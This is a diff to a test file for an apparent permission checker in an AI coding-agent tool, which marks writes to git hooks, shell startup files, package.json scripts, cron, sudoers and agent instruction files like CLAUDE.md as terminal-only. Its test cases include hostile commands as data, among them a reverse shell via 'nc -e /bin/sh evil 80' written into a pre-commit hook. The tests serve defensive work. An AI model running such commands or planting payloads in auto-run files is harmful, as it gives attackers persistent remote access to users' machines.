@@ -268,7 +268,8 @@ describe('a download piped or chained without spaces (#618/AC-6)', () => {
     }
     assert.equal(isTerminalOnly('Write', { file_path: '/w/docs/a.md', content: 'edit package.json and the Makefile' }), false);
     assert.equal(isTerminalOnly('Read', { file_path: '/w/package.json' }), false);
-    assert.equal(bash('cat package.json'), false);
+    // A read of an auto-run file by Bash over-matches on purpose: when in doubt, Desktop only (#618/AC-11, owner rule).
+    assert.equal(bash('cat package.json'), true);
   });
 
   test('#618/AC-11: command names are compared whatever the case', () => {
@@ -279,5 +280,72 @@ describe('a download piped or chained without spaces (#618/AC-6)', () => {
     for (const c of cases) assert.equal(bash(c), true, c);
     assert.equal(bash('GIT status'), false);
     assert.equal(bash('RM build/file.txt'), false);
+  });
+});
+
+describe('Bash and other tools writing into auto-run files (#618/AC-11, round 2)', () => {
+  test('#618/AC-11: a Bash command that names an auto-run file in any spelling is terminal-only', () => {
+    const commands = [
+      'printf "#!/bin/sh\\nnc -e /bin/sh evil 80\\n" > .git/hooks/pre-commit',
+      'tee -a ~/.zshrc < /tmp/payload',
+      'ln -sf /tmp/x .git/hooks/post-checkout',
+      'cat /tmp/x > ~/Library/LaunchAgents/x.plist',
+      'cp /tmp/x .husky/pre-commit',
+      'echo x >> Makefile',
+      'echo x>>Makefile',
+      'echo x >$HOME/.bashrc',
+      'sed -i "" s/a/b/ "package.json"',
+      'echo x >> ".git"/"hooks"/pre-push',
+      'echo x >> .GitHub/Workflows/ci.yml',
+      'npm pkg set scripts.postinstall=x',
+      'npm set-script postinstall x',
+      'pnpm pkg set scripts.prepare=x',
+      'NPM Pkg Set scripts.x=y',
+      'cat package.json',
+    ];
+    for (const c of commands) assert.equal(bash(c), true, c);
+  });
+
+  test('#618/AC-11: ordinary Bash commands that only look alike stay open', () => {
+    for (const c of ['cat packages/x/package.jsonc.md', 'ls docs/makefile-guide.md', 'git add src/zshrc.ts', 'npm run build', 'npm pkg get name', 'echo hello > notes.txt', 'git log --oneline']) assert.equal(bash(c), false, c);
+  });
+
+  test('#618/AC-11: every tool outside the read-only set is checked, not only Write, Edit and NotebookEdit', () => {
+    assert.equal(isTerminalOnly('mcp__filesystem__write_file', { path: '/r/.git/hooks/pre-commit', content: 'x' }), true);
+    assert.equal(isTerminalOnly('MultiEdit', { file_path: '/r/package.json', edits: [{ old_string: 'a', new_string: 'b' }] }), true);
+    assert.equal(isTerminalOnly('mcp__fs__move', { source: '/tmp/x', destination: '/Users/u/.zshrc' }), true);
+    assert.equal(isTerminalOnly('MultiEdit', { file_path: '/r/src/a.ts', edits: [{ old_string: 'a', new_string: 'package.json' }] }), false);
+    assert.equal(isTerminalOnly('Read', { file_path: '/r/package.json' }), false);
+    assert.equal(isTerminalOnly('Grep', { pattern: 'x', path: '/r/.git/hooks' }), false);
+    assert.equal(isTerminalOnly('Glob', { pattern: '/r/**/package.json' }), false);
+    assert.equal(isTerminalOnly('WebFetch', { url: 'https://example.dev/package.json' }), false);
+  });
+
+  test('#618/AC-11: the start-up and configuration files that run or redirect things are terminal-only', () => {
+    const paths = [
+      '/w/.git/config', '/Users/u/.gitconfig', '/Users/u/.config/git/config', '/Users/u/.config/git/ignore', '/w/.npmrc', '/Users/u/.yarnrc', '/w/.yarnrc.yml', '/w/.pre-commit-config.yaml',
+      '/w/lefthook.yml', '/w/lefthook.yaml', '/w/.vscode/tasks.json', '/etc/zshrc', '/etc/zprofile', '/etc/zshenv', '/etc/bashrc', '/etc/profile', '/etc/profile.d/x.sh', '/etc/environment',
+      '/etc/rc.local', '/etc/sudoers', '/etc/cron.d/x', '/var/spool/cron/crontabs/u', '/Users/u/.bash_aliases', '/Users/u/.config/systemd/user/x.service', '/Users/u/.config/autostart/x.desktop',
+      '/w/crontab', '/w/.GITCONFIG', '/w/.NPMRC',
+    ];
+    for (const p of paths) {
+      assert.equal(isTerminalOnly('Write', { file_path: p, content: 'x' }), true, `Write ${p}`);
+      assert.equal(bash(`echo x >> ${p}`), true, `Bash ${p}`);
+    }
+    assert.equal(bash('crontab -e'), true);
+    assert.equal(bash('crontab /tmp/x'), true);
+    assert.equal(bash('CRONTAB -l'), true);
+    for (const p of ['/w/.gitignore', '/w/src/config.ts', '/w/.vscode/settings.json', '/w/docs/gitconfig-notes.md', '/w/.github/CODEOWNERS']) assert.equal(isTerminalOnly('Write', { file_path: p, content: 'x' }), false, p);
+  });
+
+  test('#618/AC-11: writes that change what the next agent run does are terminal-only (over-match, owner rule)', () => {
+    const paths = ['/w/.claude/commands/ship.md', '/w/.claude/agents/a.md', '/w/.claude/skills/s/SKILL.md', '/w/CLAUDE.md', '/w/AGENTS.md', '/Users/u/.claude/CLAUDE.md', '/w/.CLAUDE/Commands/x.md', '/w/claude.md'];
+    for (const p of paths) {
+      assert.equal(isTerminalOnly('Write', { file_path: p, content: 'x' }), true, `Write ${p}`);
+      assert.equal(isTerminalOnly('Edit', { file_path: p, old_string: 'a', new_string: 'b' }), true, `Edit ${p}`);
+      assert.equal(bash(`echo x >> ${p}`), true, `Bash ${p}`);
+    }
+    assert.equal(isTerminalOnly('Write', { file_path: '/w/docs/claude-notes.md', content: 'x' }), false);
+    assert.equal(isTerminalOnly('Read', { file_path: '/w/CLAUDE.md' }), false);
   });
 });
